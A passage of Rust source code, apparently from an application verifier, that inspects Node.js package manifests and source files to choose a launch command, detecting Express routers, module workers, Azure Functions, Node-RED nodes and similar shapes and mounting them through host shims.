    let Ok(json) = serde_json::from_str::<serde_json::Value>(&manifest) else {
        return false;
    };
    let has_alias = json
        .get("scripts")
        .and_then(serde_json::Value::as_object)
        .is_some_and(|scripts| {
            ["serve", "server", "app"].iter().any(|name| {
                scripts
                    .get(*name)
                    .and_then(serde_json::Value::as_str)
                    .is_some_and(|command| !command.trim().is_empty())
            })
        });
    if has_alias {
        return false;
    }
    json.get("main")
        .and_then(serde_json::Value::as_str)
        .and_then(|main| package_file(root, main))
        .is_some_and(|main| is_cli_dispatcher(&root.join(&main)))
}

/// Whether the package manifest's selected launch is a front-end dev/build server rather than an
/// HTTP backend. Such a command (`react-scripts`, `vite`, `vue-cli-service`, `@angular/cli`,
/// `gatsby`, `parcel`, `snowpack`, `webpack-dev-server`) compiles and serves the client bundle and
/// answers every path with the SPA shell, so a backend route can never be exercised through it.
/// Mirrors [`manifest_start_command`]'s script precedence (`start`, then `serve`/`server`/`app`).
fn manifest_launch_is_frontend(root: &std::path::Path) -> bool {
    const FRONTEND_TOOLS: [&str; 9] = [
        "react-scripts",
        "vue-cli-service",
        "ng serve",
        "gatsby develop",
        "webpack-dev-server",
        "webpack serve",
        "parcel ",
        "snowpack ",
        "vite",
    ];
    let Ok(manifest) = std::fs::read_to_string(root.join("package.json")) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&manifest) else {
        return false;
    };
    let Some(scripts) = json.get("scripts").and_then(serde_json::Value::as_object) else {
        return false;
    };
    let selected = ["start", "serve", "server", "app"]
        .into_iter()
        .find_map(|name| {
            scripts
                .get(name)
                .and_then(serde_json::Value::as_str)
                .filter(|command| !command.trim().is_empty())
        });
    selected.is_some_and(|command| FRONTEND_TOOLS.iter().any(|tool| command.contains(tool)))
}

/// The launch command that mounts an Express router module through the Express host shim
/// ([`EXPRESS_HOST_JS`]): the shim imports the module, collects the router(s)/app(s) it exports (or
/// that its exported factories return), mounts them on a fresh Express app, and serves it on `PORT`.
fn express_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-express-host.mjs\",\"{file}\"]")
}

/// Whether a JavaScript file is a mountable Express router module: it pulls in Express and builds a
/// `express.Router()` (directly, or via an exported factory) but never calls `.listen(` itself. Such
/// a module publishes routes without a server of its own — the application wires it into one at
/// runtime (often behind a CLI subcommand) — so it is launched through the Express host shim rather
/// than run directly, which would only evaluate and exit. A self-contained server (which does
/// `.listen(`) is left to the normal launch path.
fn is_express_router_module(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    src.contains("express") && src.contains(".Router(") && src.contains("export")
}

/// Whether a JavaScript file exports an unstarted Express app: it constructs one (`express()`),
/// exports it (`module.exports` / `export default`), and never calls `.listen(` itself.
fn is_express_app_module(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    !src.contains(".listen(")
        && src.contains("express(")
        && (src.contains("module.exports") || src.contains("export default"))
}

/// Whether a module exports a factory that constructs an Express application. The Express host can
/// invoke such a factory and mount the returned real app directly; this is useful when a separate
/// production bootstrap performs mandatory infrastructure initialization before it starts listening.
fn is_express_factory_module(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") || !src.contains("express(") {
        return false;
    }
    (src.contains("export function ")
        || src.contains("export async function ")
        || src.contains("export const ")
        || src.contains("exports.")
        || src.contains("module.exports"))
        && (src.contains("createApp") || src.contains("createServer") || src.contains("buildApp"))
}

/// Whether the manifest's `start` script is a plain `node <file>` launch whose file does not exist
/// in the package, so `npm start` can only fail with `MODULE_NOT_FOUND`.
fn manifest_start_file_missing(root: &std::path::Path) -> bool {
    let Some(start) = std::fs::read_to_string(root.join("package.json"))
        .ok()
        .and_then(|manifest| serde_json::from_str::<serde_json::Value>(&manifest).ok())
        .and_then(|json| {
            json.get("scripts")?
                .get("start")?
                .as_str()
                .map(str::to_owned)
        })
    else {
        return false;
    };
    if ["&&", "|", ";", "&"].iter().any(|op| start.contains(op)) {
        return false;
    }
    let mut words = start.split_whitespace();
    if words.next() != Some("node") {
        return false;
    }
    let Some(file) = words.next() else {
        return false;
    };
    [".js", ".cjs", ".mjs"]
        .iter()
        .any(|ext| file.ends_with(ext))
        && !file.starts_with('/')
        && !root.join(file).exists()
}

/// The launch command that mounts a lifecycle server module through the lifecycle host shim
/// ([`LIFECYCLE_HOST_JS`]): the shim imports the module, calls its exported factory with a permissive
/// host context whose `.app` is a minimal Express-compatible server, runs the returned object's
/// lifecycle method(s) so its routes register, and serves them over HTTP on `PORT`.
fn lifecycle_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-lifecycle-host.mjs\",\"{file}\"]")
}

/// Whether a JavaScript file is a lifecycle server module in the OS.js/meeseOS provider shape: an
/// exported factory `(core, proc) => ({ init, start, destroy })` that, run by the host, registers
/// HTTP routes on a server object the host supplies (`core.app.post(proc.resource(path), handler)`)
/// but never constructs or `.listen(`s a server of its own. Such a module publishes no server — the
/// host application wires its routes into one at deploy time by calling the lifecycle method — so it
/// is launched through the lifecycle host shim, which calls the factory and the lifecycle method on a
/// mock host before serving the registered routes. A self-contained server (`.listen(`) and the
/// Express-router / plug-in shapes are matched by their own paths before this one.
fn is_lifecycle_server_module(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    // Namespaces its routes through the host's resource resolver (the provider convention), registers
    // at least one HTTP route verb on the host-supplied server, and is a factory module the host runs.
    let registers_route = [".get(", ".post(", ".put(", ".patch(", ".delete(", ".ws("]
        .iter()
        .any(|verb| src.contains(verb));
    let namespaces = src.contains(".resource(");
    let is_factory_module = src.contains("module.exports") || src.contains("export default");
    namespaces && registers_route && is_factory_module
}

/// The launch command that mounts a file-system route handler module through the route host shim
/// ([`ROUTE_HOST_JS`]): the shim imports the module, takes the request handler it exports (a bare
/// handler function, or the `fn`/`handler` of a descriptor object), and serves it over HTTP on
/// `PORT`.
fn route_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-route-host.mjs\",\"{file}\"]")
}

/// The launch command that mounts an Azure Functions v4 application module through the Azure host shim
/// ([`AZURE_FUNC_HOST_JS`]): the shim mocks `@azure/functions`, transpiles and loads the module so its
/// `app.http(...)` HTTP triggers register, and serves them over HTTP on `PORT`.
fn azure_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-azure-func-host.cjs\",\"{file}\"]")
}

/// The launch command that serves a module worker through the worker host shim ([`WORKER_HOST_JS`]):
/// the shim imports the module, takes its default export's `fetch(request, env, ctx)` method, and
/// serves it over HTTP on `PORT`, building a web `Request` per connection and writing the handler's
/// web `Response` back.
fn worker_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-worker-host.mjs\",\"{file}\"]")
}

/// Whether a JavaScript/TypeScript file is a module worker: its default export is an object literal
/// (`export default { ... }`) that declares a `fetch` handler, and it never binds a listener of its own
/// (`.listen(`). Cloudflare Workers, Deno and Bun all serve an HTTP origin this way — the runtime
/// invokes `default.fetch(request)` per request — so such a module publishes no server and is launched
/// through the worker host shim rather than run directly, which would only evaluate and exit. The
/// `export default {` shape plus a `fetch` method is the structural signal; no runtime package
/// identifier or global is assumed.
fn is_module_worker(path: &std::path::Path) -> bool {
    let is_source = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs" | "ts" | "mts" | "cts"));
    if !is_source {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    // A self-contained server (it constructs and `.listen(`s its own listener) is left to the normal
    // launch path; a worker never binds one.
    if src.contains(".listen(") {
        return false;
    }
    // The default export must be an object literal.
    let Some((_, after)) = src.split_once("export default") else {
        return false;
    };
    if !after.trim_start().starts_with('{') {
        return false;
    }
    // whose body declares a `fetch` *handler*: a method shorthand (`fetch(` / `async fetch(`) or a
    // function-valued property (`fetch: async`/`fetch: function`/`fetch: (...) =>`). A `fetch` property
    // holding a plain value (`fetch: 'https://...'`) is not a worker handler and must not match.
    declares_fetch_handler(after)
}

/// Whether `body` declares a function-shaped `fetch` *member* of the object: the method shorthand
/// `fetch(` / `async fetch(`, or a property whose value opens a function (`fetch: async`,
/// `fetch: function`, `fetch: (...)`). It must be a property key, told apart from an ordinary
/// `await fetch(url)` call in a handler body by its boundaries: what follows opens a function, and what
/// precedes it (after an optional `async`/`*`) is an object-literal property boundary (`{`, `,`, or the
/// start of a line), never an expression context (`await`, `return`, `=`, `.`, `(`). A `fetch` property
/// bound to a non-function value does not qualify.
fn declares_fetch_handler(body: &str) -> bool {
    let mut search_start = 0;
    while let Some(rel) = body[search_start..].find("fetch") {
        let at = search_start + rel;
        search_start = at + "fetch".len();
        let rest = body[search_start..].trim_start();
        let opens_function = rest.starts_with('(')
            || rest.strip_prefix(':').is_some_and(|value| {
                let value = value.trim_start();
                value.starts_with("async")
                    || value.starts_with("function")
                    || value.starts_with('(')
            });
        if !opens_function {
            continue;
        }
        // Strip a method modifier, then look at the last non-space character before the member.
        let mut preceding = body[..at].trim_end();
        preceding = preceding
            .strip_suffix("async")
            .unwrap_or(preceding)
            .trim_end();
        preceding = preceding.strip_suffix('*').unwrap_or(preceding).trim_end();
        if matches!(preceding.chars().last(), None | Some('{') | Some(',')) {
            return true;
        }
    }
    false
}

/// Whether a file is a Vercel/Netlify filesystem function: a handler module under a deployment-root
/// `api/` directory ([`jss_frontend::routes::vercel_api_route_path`]) whose default export is a request
/// handler and which binds no listener of its own (`.listen(`). The platform runtime invokes the
/// default export once per request — an edge function takes a single web `Request` and returns a
/// `Response`; a Node function takes `(req, res)` — so the module publishes no server and is mounted on
/// a throwaway server through the worker host shim rather than run directly, which would only evaluate
/// and exit. The `api/`-directory convention is the platform's, and the handler shape is read from the
/// module's own default export; no app-specific identifier is assumed.
fn is_vercel_function(root: &std::path::Path, file: &str) -> bool {
    if jss_frontend::routes::vercel_api_route_path(file).is_none() {
        return false;
    }
    let path = root.join(file);
    let is_source = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs" | "ts" | "mts" | "cts"));
    if !is_source {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(&path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    exports_route_handler(&src)
}

/// Whether the package manifest's selected launch is the Azure Functions host (`func start` /
/// `func host start`). Such a command needs the Azure Functions Core Tools runtime, which serves the
/// `app.http(...)` triggers a v4 module registers but is not present in the verifier image; the module
/// itself declares no listener, so it is launched through the Azure host shim instead. Mirrors
/// [`manifest_start_command`]'s script precedence (`start`, then `serve`/`server`/`app`).
fn manifest_launch_is_azure_functions(root: &std::path::Path) -> bool {
    let Ok(manifest) = std::fs::read_to_string(root.join("package.json")) else {
        return false;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&manifest) else {
        return false;
    };
    let scripts = json.get("scripts").and_then(serde_json::Value::as_object);
    let launch = scripts.and_then(|scripts| {
        ["start", "serve", "server", "app"]
            .into_iter()
            .find_map(|name| {
                scripts
                    .get(name)
                    .and_then(serde_json::Value::as_str)
                    .filter(|command| !command.trim().is_empty())
            })
    });
    launch.is_some_and(|command| {
        command.split("&&").map(str::trim).any(|segment| {
            segment == "func start"
                || segment.starts_with("func start ")
                || segment == "func host start"
                || segment.starts_with("func host start ")
        })
    })
}

/// Whether a JavaScript/TypeScript file is an Azure Functions v4 application module: it imports the
/// `@azure/functions` SDK and registers at least one HTTP trigger on the `app` object
/// (`app.http(...)`/`app.get(...)`/…), but never binds a listener of its own (`.listen(`). The Azure
/// Functions host loads such a module for these registration side effects and serves the triggers
/// itself, so the module is launched through the Azure host shim rather than run directly. TypeScript
/// and JSX sources are accepted — the shim transpiles them — since a v4 app is conventionally authored
/// in TypeScript and compiled by the host's tooling.
fn is_azure_functions_v4_module(path: &std::path::Path) -> bool {
    let is_source = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| {
            matches!(
                ext,
                "js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx" | "mts" | "cts"
            )
        });
    if !is_source {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    if !src.contains("@azure/functions") {
        return false;
    }
    [
        "app.http(",
        "app.get(",
        "app.post(",
        "app.put(",
        "app.patch(",
        "app.deleteRequest(",
        "app.delete(",
    ]
    .iter()
    .any(|marker| src.contains(marker))
}

/// The launch command that mounts a Node-RED node module through the Node-RED host shim
/// ([`NODE_RED_HOST_JS`]): the shim imports the module, calls its exported `function (RED)` factory
/// with a minimal mock Node-RED runtime whose `RED.httpAdmin`/`RED.httpNode` are Express-compatible
/// route collectors, so the admin/node HTTP routes the module registers at load time serve over
/// `PORT`.
fn node_red_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-node-red-host.mjs\",\"{file}\"]")
}

/// Whether a JavaScript file is a Node-RED node module that exposes HTTP routes: the Node-RED runtime
/// loads every node module by calling `module.exports = function (RED) { ... }`, passing the `RED`
/// object through which a node registers admin/editor routes (`RED.httpAdmin.post('/x/:id', ...)`) or
/// node HTTP endpoints (`RED.httpNode.get(...)`). Such a module publishes no server of its own (no
/// `.listen(`) — the Node-RED runtime hosts it — so it is launched through the Node-RED host shim,
/// which reconstructs that runtime contract and serves the routes. Matched after the self-contained
/// server, Express-router, plug-in and lifecycle shapes; a module that registers no `httpAdmin`/
/// `httpNode` route exposes no HTTP entry point and is not selected.
fn is_node_red_node_module(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    // A node module is a factory the runtime calls with `RED`; it registers at least one HTTP route on
    // one of the two routers the runtime exposes. The textual markers mirror the runtime's own API.
    let is_factory_module = src.contains("module.exports") || src.contains("export default");
    let registers_route = ["RED.httpAdmin", "RED.httpNode"].iter().any(|router| {
        [".get(", ".post(", ".put(", ".patch(", ".delete("]
            .iter()
            .any(|verb| src.contains(&format!("{router}{verb}")))
    });
    is_factory_module && registers_route
}

/// HTTP method names a convention-based file-system router uses as the route file's own name.
const ROUTE_METHOD_STEMS: [&str; 10] = [
    "get", "post", "put", "patch", "delete", "head", "options", "all", "any", "ws",
];

/// Whether a JavaScript file is a file-system route handler module: a module inside a `routes` tree
/// whose own file name is an HTTP method (`routes/users/get.js`, `routes/foo/post.js`) and whose
/// default export is the request handler for that method — a bare `(req, res, ctx) => ...` function,
/// or a descriptor object that carries the handler under `fn`/`handler` (alongside optional metadata
/// such as the contexts it declares). A convention-based router (linebridge, Nitro/h3 and similar)
/// discovers these files, derives the route path from their directory and the method from their file
/// name, and invokes the handler per request; the file publishes no server of its own (no
/// `.listen(`), so it is launched through the route host shim, which reconstructs that contract on a
/// throwaway server rather than running the module directly (which would only evaluate and exit).
/// Matched after the self-contained-server, Express-router, plug-in and lifecycle shapes.
fn is_route_handler_module(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let stem = path
        .file_stem()
        .and_then(|stem| stem.to_str())
        .unwrap_or("");
    if !ROUTE_METHOD_STEMS.contains(&stem) {
        return false;
    }
    // The file-system router convention: the handler file lives within a `routes` directory tree.
    let in_routes = path.components().any(|component| {
        matches!(component, std::path::Component::Normal(name) if name.eq_ignore_ascii_case("routes"))
    });
    if !in_routes {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    exports_route_handler(&src)
}

/// Whether a module's default export is a request handler the route host shim can mount: a function
/// (`export default (req, res) => ...`, `module.exports = function (req, res) {...}`), or an object
/// literal carrying the handler under an `fn`/`handler` property. A plain data export (a config
/// object with neither) is not matched.
fn exports_route_handler(src: &str) -> bool {
    for marker in ["export default", "module.exports"] {
        let Some(at) = src.find(marker) else {
            continue;
        };
        let mut rhs = src[at + marker.len()..].trim_start();
        if marker == "module.exports" {
            let Some(stripped) = rhs.strip_prefix('=') else {
                continue;
            };
            rhs = stripped.trim_start();
        }
        // A bare function handler.
        if rhs.starts_with("function")
            || rhs.starts_with("async")
            || rhs.starts_with('(')
            || rhs.starts_with("() =>")
        {
            return true;
        }
        // A descriptor object exposing the handler under `fn`/`handler`.
        if rhs.starts_with('{')
            && let Some(object) = balanced_object(rhs)
        {
            for key in ["fn", "handler"] {
                if object_has_function_property(&object, key) {
                    return true;
                }
            }
        }
    }
    false
}

/// The `{ ... }` object literal text at the start of `rhs` (including the braces), by brace matching
/// that skips string and template literals. `None` when `rhs` does not open with a balanced object.
fn balanced_object(rhs: &str) -> Option<String> {
    let bytes = rhs.as_bytes();
    if bytes.first() != Some(&b'{') {
        return None;
    }
    let mut depth = 0i32;
    let mut quote: Option<u8> = None;
    let mut escaped = false;
    for (i, &b) in bytes.iter().enumerate() {
        if let Some(q) = quote {
            if escaped {
                escaped = false;
            } else if b == b'\\' {
                escaped = true;
            } else if b == q {
                quote = None;
            }
            continue;
        }
        match b {
            b'\'' | b'"' | b'`' => quote = Some(b),
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(rhs[..=i].to_owned());
                }
            }
            _ => {}
        }
    }
    None
}

/// Whether an object literal's text declares a property named `key` whose value is a function: the
/// `key:` form (`fn: async (req, res) => ...`, `handler: function () {}`) or the method shorthand
/// (`fn(req, res) {}`, `async handler() {}`). A non-function property of the same name is not matched.
fn object_has_function_property(object: &str, key: &str) -> bool {
    let bytes = object.as_bytes();
    let mut from = 0;
    while let Some(rel) = object[from..].find(key) {
        let at = from + rel;
        from = at + key.len();
        let ident = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'$';
        let before_ok = at == 0 || bytes.get(at - 1).is_none_or(|b| !ident(*b));
        if !before_ok {
            continue;
        }
        let after = object[at + key.len()..].trim_start();
        // `key: <function>`
        if let Some(value) = after.strip_prefix(':') {
            let value = value.trim_start();
            if value.starts_with("function") || value.starts_with("async") || value.starts_with('(')
            {
                return true;
            }
            continue;
        }
        // `key(...) {` or `async key(...) {` method shorthand.
        if after.starts_with('(') {
            return true;
        }
    }
    false
}

/// Whether a JavaScript file is a command-line dispatcher: it drives a CLI argument parser
/// (`commander` or `yargs`) and calls `.parse(`/`.parseAsync(`, but never `.listen(`. Run bare it
/// prints usage for the available subcommands and exits, so the server a subcommand would have
/// started is never reached. Used to decide that a manifest `main` of this shape is not a launchable
/// server.
fn is_cli_dispatcher(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    let uses_framework = src.contains("commander") || src.contains("yargs");
    let parses = src.contains(".parse(") || src.contains(".parseAsync(");
    uses_framework && parses
}

/// A launch command read from the package manifest. Prefer the conventional `start` script, then
/// the common server aliases used by applications that reserve `start` for deployment tooling, then
/// a package `main` file. Arbitrary build/test scripts are never selected. `None` when the
/// directory has no `package.json` or it declares no launchable entry.
fn manifest_start_command(root: &std::path::Path) -> Option<String> {
    let manifest = std::fs::read_to_string(root.join("package.json")).ok()?;
    let json = serde_json::from_str::<serde_json::Value>(&manifest).ok();
    if has_start_script(&manifest) {
        let scripts = json
            .as_ref()
            .and_then(|value| value.get("scripts"))
            .and_then(serde_json::Value::as_object);
        let start = scripts
            .and_then(|scripts| scripts.get("start"))
            .and_then(serde_json::Value::as_str);
        let dev = scripts
            .and_then(|scripts| scripts.get("dev"))
            .and_then(serde_json::Value::as_str);
        // A failed production build leaves `next start` with no `.next/BUILD_ID`. The verifier only
        // needs the real route handler, so fall back to the repository's own Next dev script and let
        // it compile that route on demand. Select webpack first for Next 16 projects whose existing
        // webpack configuration makes the new Turbopack default abort; older Next versions retry
        // without the flag if they do not recognize it.
        if start.is_some_and(|command| contains_command(command, "next", "start"))
            && dev.is_some_and(|command| contains_command(command, "next", "dev"))
        {
            return Some(
                "[\"sh\",\"-c\",\"if [ -f .next/BUILD_ID ]; then npm start; else npm run dev -- --webpack --hostname 0.0.0.0 || npm run dev -- --hostname 0.0.0.0; fi\"]"
                    .to_owned(),
            );
        }
        // A start/dev launcher that boots an ephemeral `mongodb-memory-server` only to mint a
        // connection URL and then execs the app's real Next server (`node scripts/dev.js` →
        // `MongoMemoryServer.create()` then `next dev <dir>`). The in-process MongoDB download is a
        // dev-time convenience and fails with no network, so the container exits before it listens.
        // The honest equivalent — and the app's own production mode, where `instrumentation` reads
        // `MONGO_URI` from the environment — is to run the Next server directly against the MongoDB
        // sidecar the verifier already provides and injects as `MONGO_URI`. Checked before the plain
        // npm fallback, which would re-run the failing launcher. General: triggered by the launcher's
        // own `mongodb-memory-server` + Next usage, never by a name or path.
        if let Some(command) = ephemeral_mongo_next_launch(root, scripts) {
            return Some(command);
        }
        // A start script that hands the server to a Node process manager (`pm2 start server.js
        // --name GC`, `pm2-runtime server.js`, `forever start server.js`) launches the same entry
        // file but through deployment tooling that is not a dependency of the app itself: pm2/forever
        // daemonize (the launcher returns and the container exits) and are usually absent from the
        // image. The honest equivalent is to run the very file the manager would run directly with
        // `node`, which binds the identical listener. Checked before the detached form and the plain
        // npm fallback.
        let managed = start
            .and_then(process_manager_script)
            .and_then(|file| package_file(root, file))
            .filter(|file| is_standalone_server(&root.join(file)));
        if let Some(file) = managed {
            return Some(format!("[\"node\",\"{file}\"]"));
        }
        // `npm start` is only a shell launcher for a plain `node <file> [args...]` script. Running
        // that argv directly keeps the real server as the observed process: npm can otherwise exit
        // while a re-parented Node child is still initializing, making the verifier classify a live
        // application as a failed launch. The parser rejects shell syntax and preserves literal
        // arguments, so compound scripts retain npm's normal behavior.
        if let Some(command) = start.and_then(|script| direct_node_command(script, root)) {
            return Some(command);
        }
        // A start script that only detaches the server (`./server.js > log 2>&1 & disown`)
        // returns at once, and the container with it: run the detached file in the foreground.
        let detached = json
            .as_ref()
            .and_then(|json| json.get("scripts")?.get("start")?.as_str())
            .and_then(detached_script)
            .and_then(|file| package_file(root, file));
        return Some(match detached {
            Some(file) => format!("[\"node\",\"{file}\"]"),
            None => "[\"npm\",\"start\"]".to_owned(),
        });
    }
    if let Some(script) = json
        .as_ref()
        .and_then(|value| value.get("scripts"))
        .and_then(serde_json::Value::as_object)
        .and_then(|scripts| {
            ["serve", "server", "app"].into_iter().find(|name| {
                scripts
                    .get(*name)
                    .and_then(serde_json::Value::as_str)
                    .is_some_and(|command| !command.trim().is_empty())
            })
        })
    {
        return Some(format!("[\"npm\",\"run\",\"{script}\"]"));
    }
    if let Some(main) = json
        .as_ref()
        .and_then(|value| value.get("main"))
        .and_then(serde_json::Value::as_str)
        .and_then(|main| package_file(root, main))
    {
        // A `main` that is a plug-in handler module — it registers an HTTP request handler on a
        // host-provided web-server service but never listens itself — would just evaluate and exit
        // under `node <main>`, never binding a port. Mount its registered handler(s) on a throwaway
        // server instead, so a genuinely reachable sink is still exercised.
        if is_plugin_handler(&root.join(&main)) {
            return Some(plugin_host_command(&main));
        }
        return Some(format!("[\"node\",\"{main}\"]"));
    }
    // No start script and no `main`: a package may still document a conventional launcher entry file
    // (`node src/index.js`) while reserving every npm script for tests or deployment. Launch that
    // file directly so the route under test is served. The chosen file must itself bind a port, so
    // running it starts the server rather than loading a library.
    conventional_entry(root).map(|file| format!("[\"node\",\"{file}\"]"))
}

fn contains_command(command: &str, program: &str, argument: &str) -> bool {
    let words: Vec<&str> = command.split_whitespace().collect();
    words.windows(2).any(|pair| pair == [program, argument])
}

/// A conventional launcher entry file of the package, when its manifest names no launch. Node's own
/// default entry (`index.js`) and the common server filenames (`server`, `app`, `main`) are tried at
/// the package root and under `src/` and `bin/`, in that order. The chosen file must itself bind a
/// port ([`is_launchable_entry`]) so that running it with `node <file>` starts the server rather than
/// merely loading a library or exporting an unstarted app factory.
fn conventional_entry(root: &std::path::Path) -> Option<String> {
    const DIRS: [&str; 3] = ["", "src", "bin"];
    const NAMES: [&str; 4] = ["index", "server", "app", "main"];
    const EXTS: [&str; 3] = ["js", "cjs", "mjs"];
    for dir in DIRS {
        for name in NAMES {
            for ext in EXTS {
                let rel = if dir.is_empty() {
                    format!("{name}.{ext}")
                } else {
                    format!("{dir}/{name}.{ext}")
                };
                if let Some(file) = package_file(root, &rel)
                    && is_launchable_entry(&root.join(&file))
                {
                    return Some(file);
                }
            }
        }
    }
    None
}

/// Whether a JavaScript file starts a server when run with `node <file>`: it binds a port (`.listen(`),
/// whether it constructs the listener itself or imports an app factory and listens on the result. Used
/// to select a conventional launcher entry when the manifest names no launch; a module that only
/// exports an unstarted app (no `.listen(`) is not a launcher.
fn is_launchable_entry(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    std::fs::read_to_string(path).is_ok_and(|src| src.contains(".listen("))
}

/// The launch command that mounts a plug-in handler module through the plug-in host shim
/// ([`PLUGIN_HOST_JS`]): the shim imports the module, captures the request handler it registers on a
/// mock host context, and serves it over HTTP on `PORT`.
fn plugin_host_command(file: &str) -> String {
    format!("[\"node\",\"/jss-plugin-host.mjs\",\"{file}\"]")
}

/// Whether a JavaScript file is a plug-in handler module: one that registers an HTTP request handler
/// on a host-provided service (`ctx`/`app`/`server`.`register`/`route`/`addRoute`, with a `handler`)
/// from inside a plug-in `apply`, and never calls `.listen(` itself. Such a module publishes no
/// server of its own — the host it plugs into supplies one at deploy time — so it is launched through
/// the plug-in host shim rather than run directly. A self-contained server (which does `.listen(`) is
/// left to the normal launch path.
fn is_plugin_handler(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    if src.contains(".listen(") {
        return false;
    }
    let registers =
        src.contains(".register(") || src.contains(".route(") || src.contains(".addRoute(");
    registers && src.contains("handler") && src.contains("apply")
}

/// Whether a JavaScript file is a self-contained server: one that both constructs a listener
/// (`http.createServer`, an `express()`/`koa`/`fastify`/`polka` app, `new Server`) and calls
/// `.listen(`. Such a file starts a server on its own when run with `node <file>`, so a repository
/// of standalone scripts with no manifest is still launchable. A plain module that merely exports a
/// handler (no `.listen`) is not selected.
fn is_standalone_server(path: &std::path::Path) -> bool {
    let is_js = path
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| matches!(ext, "js" | "mjs" | "cjs"));
    if !is_js {
        return false;
    }
    let Ok(src) = std::fs::read_to_string(path) else {
        return false;
    };
    let listens = src.contains(".listen(");
    let constructs = src.contains("createServer")
        || src.contains("express(")
        || src.contains("new Koa")
        || src.contains("fastify(")
        || src.contains("polka(")
        || src.contains("new Server");
    listens && constructs && !only_exports_uninvoked_server_start(&src)
}

fn only_exports_uninvoked_server_start(src: &str) -> bool {
    ["export async function ", "export function "]
        .into_iter()
        .filter_map(|prefix| src.find(prefix).map(|at| (prefix, at)))
        .any(|(prefix, at)| {
            let after = &src[at + prefix.len()..];
            let name = after
                .split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '_' || ch == '$'))
                .next()
                .unwrap_or_default();
            !name.is_empty()
                && src.match_indices(name).count() == 1
                && after.contains("createServer")
                && after.contains(".listen(")
        })
}

fn node_file_command(file: &str) -> String {
    serde_json::json!(["node", file]).to_string()
}

/// A UTF-8 file inside the package, never an absolute path or one containing `..`. Commands that
/// consume the returned name serialize it as JSON, so ordinary non-ASCII repository filenames are
/// safe and do not need to be rejected.
fn package_file(root: &std::path::Path, path: &str) -> Option<String> {
    let path = path.trim_start_matches("./");
    let candidate = std::path::Path::new(path);
    let safe = !path.is_empty()
        && candidate
            .components()
            .all(|part| matches!(part, std::path::Component::Normal(_)));
    (safe && root.join(path).is_file()).then(|| path.to_owned())
}

/// The JavaScript file a start script runs in the background and leaves running, when that is
/// all it does: `./server.js > /dev/null 2>&1 & disown`, `nohup node server.js &`. Output
/// redirections are dropped; anything else (a second command, `&&`, a pipe, arguments) is not
/// a plain detached server, and `None`.
fn detached_script(script: &str) -> Option<&str> {
    let script = script.trim();
    let script = script.strip_suffix("disown").unwrap_or(script).trim_end();
    let command = script.strip_suffix('&')?;
    let mut words = command.split_whitespace().peekable();
    if words.peek() == Some(&"nohup") {
        words.next();
    }
    if words.peek() == Some(&"node") {
        words.next();
    }
    let file = words.next()?;
    let plain = |w: &str| {
        !w.is_empty()
